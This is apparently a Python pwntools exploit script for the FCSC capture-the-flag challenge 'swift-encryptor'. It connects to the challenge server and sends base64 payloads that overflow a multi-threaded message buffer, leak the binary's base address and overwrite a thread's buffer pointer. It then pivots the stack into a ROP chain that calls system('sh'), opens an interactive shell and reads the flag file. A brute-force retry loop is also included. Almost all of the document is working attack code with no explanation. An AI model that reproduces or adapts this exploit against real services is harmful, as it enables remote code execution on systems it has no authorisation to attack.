from pwn import *
import pwn
import random as rnd
import base64 as b64
import struct as st
from time import sleep
import re
import subprocess
from itertools import *
from more_itertools import *

file = './swift-encryptor'
exe_args = []
PREFIX = (b": ", b"> ")
speed = 0.2

io: process = None

def debug(pid=io):
    gdb.attach(pid, gdbscript=
    """
    
    """, exe=file)
    input("debug")

def launch_remote():
    global file, io
    host = args.HOST if args.HOST else 'chall.fcsc.fr'
    port = args.PORT if args.PORT else 2104
    io = remote(host, port)

def launch_docker():
    global file, io
    io = remote("localhost", 2104)
    if args.GDB:
        out = subprocess.run(["pgrep", "--newest", "^None$"], capture_output=True)
        debug(int(out.stdout))

def launch_local():
    global file, io
    io = process([file, *exe_args])
    if args.GDB:
        debug(io)

def solve_pow():
    leak = recvu(b"===================")
    pow = getb(leak, b") solve ", b"\n").decode()
    proc = subprocess.Popen(["solvepow", "solve", pow], stdout=subprocess.PIPE, stderr=subprocess.DEVNULL)
    pow = proc.communicate()[0]
    sla(b"Solution? ", pow)

u64 = lambda d: pwn.u64(d.ljust(8, b"\0")[:8])
u32 = lambda d: pwn.u32(d.ljust(4, b"\0")[:4])
u16 = lambda d: pwn.u16(d.ljust(2, b"\0")[:2])
sla = lambda a, b: io.sendlineafter(a, b)
sa = lambda a, b: io.sendafter(a, b)
sl = lambda a: io.sendline(a)
recv = lambda: io.recv()
recvn = lambda a: io.recvn(a)
recvu = lambda a, b=False: io.recvuntil(a, b)
safe_link = lambda addr, ptr: (addr >> 12) ^ ptr
ptr_mangle = lambda addr, cookie=0: rol(addr ^ cookie, 17)
ptr_demangle = lambda addr, cookie=0: ror(addr, 17) ^ cookie
ptr_getcookie = lambda mangled, demangled: ptr_demangle(mangled, demangled)
binsh = lambda: next(libc.search(b"/bin/sh\0"))
snum = lambda a, b: sla(a, str(b).encode("iso-8859-1"))
slaprefix = lambda a: sla(PREFIX, a)
saprefix = lambda a: sa(PREFIX, a)
choice = lambda a: snum(PREFIX, a)

def printx(**kwargs):
    for k, v in kwargs.items():
        success("%s: %#x" % (k, v))

def launch():
    if args.REMOTE:
        l = launch_remote
    elif args.DOCKER:
        l = launch_docker
    else:
        l = launch_local
    with context.local(log_level=logging.ERROR):
        l()
    if args.POW:
        solve_pow()

def getb(d, a, b):
    a_ = d.find(a)
    if a_ == -1 or a == b"": a_ = 0
    b_ = d.find(b, a_+len(a))
    if b_ == -1 or b == b"": b_ = len(d)
    return d[a_+len(a):b_]
def getr(d, p):
    return re.findall(p, d)[0]

# ================================================================
# EXPLOIT HERE
# ================================================================

with context.local(log_level=logging.ERROR):
    exe = ELF(file)
    libc = exe.libc
context.binary = exe

tries = 0

def exploit():
    def msg(num, data):
        return p16(num) + data[:14].ljust(14, b"\0")

    while True:
        payload = b"A"*0x10*251
        payload += flat([
            0, 0, # to interface
            0, 0, # to decoder
            0, 0, # to splitter
            0, 0, # to joiner 

            0x1000, 0, # to encoder thread, data size = 0x1000 -> heap leak
        ])
        slaprefix(b64.b64encode(payload))

        recvu(b"[encoder] ")
        leak = recvu(b"\n", True)
        leak = b64.b64decode(leak)
        leaks = []
        for i, c in enumerate(sliced(leak[4:], 8)):
            leaks.append(u64(c))
            # print("%#04x: %016x" % (i, u64(c)))

        for i, l in enumerate(leaks[:-2]):
            if l & ~0b1111 == 0x80 and (leaks[i+2] & 0xfff) == 0x119:
                exe.address = leaks[i+2] - 0x2119
        if exe.address != 0:
            break

    printx(exe=exe.address)
    key = b"\x5e\x5f\xc3\x3d\xb9\x27\x6f\x6e\xd8\xd5\xce\xeb\x1e\x0e\x75\x8d"

    leave_ret = exe.address + 0x00000000000015b0
    pop_rdi = exe.address + 0x00000000000020ad
    binsh_addr = exe.address+0x5820-8

    bss = exe.address + 0x5800

    payload = b""
    payload += xor(b"A"*0x10, key)*251
    payload += flat([
        0, 0, # sent to interface thread (id=256=0)
        0, 0, # sent to decoder (NULL so it will ignore)
        0, 0, # sent to splitter (ignore too)
        
        # sent to joiner
        # rewrite buffer pointer of joiner thread (at buffer+0x10*0x204) with bss (for future stack pivot)
        msg(0x204, p64(bss) + p64(0)),

        0, 0, # sent to encoder (ignore too)
    ])
    payload += xor(b"A"*0x10, key)*251
    payload += flat([
        1, 0,
        0, 0,
        0, 0,

        msg(0, p64(pop_rdi) + p64(binsh_addr)), # write at bss+0x10*0

        0, 0,
    ])
    slaprefix(b64.b64encode(payload))

    payload = b""
    payload += xor(b"A"*0x10, key)*251
    payload += flat([
        0, 0,
        0, 0,
        0, 0,

        # rewrite buffer pointer of joiner thread (at buffer+0x10*0x204) with bss (for future stack pivot)
        msg(0x204, p64(bss) + p64(0)),

        0, 0,
    ])
    payload += xor(b"A"*0x10, key)*251
    payload += flat([
        1, 0,
        0, 0,
        0, 0,

        msg(1, p64(exe.plt.system) + b"sh"), # write at bss+0x10*1

        0, 0,
    ])
    slaprefix(b64.b64encode(payload))



    payload = b""
    payload += xor(b"A"*0x10, key)*251
    payload += flat([
        1, 0,
        0, 0,
        0, 0,

        # buffer+0x10*0x106 = saved rbp & rip
        msg(0x106, p64(bss-8) + p64(leave_ret)), # rbp & rip

        0, 0,
    ])
    slaprefix(b64.b64encode(payload))

    slaprefix(b"aaaa") # trigger another encryption -> will force last joiner to exit -> execute our ropchain
    sl(b"cat fla*")

    io.interactive()
    exit()

if not args.BF:
    launch()
    exploit()
    exit()
else:
    tries_prog = log.progress("Tries")
    while True:
        tries += 1
        tries_prog.status(str(tries))

        launch()
        try:
            exploit()
        except EOFError:
            pass

        with context.local(log_level=logging.ERROR):
            io.close()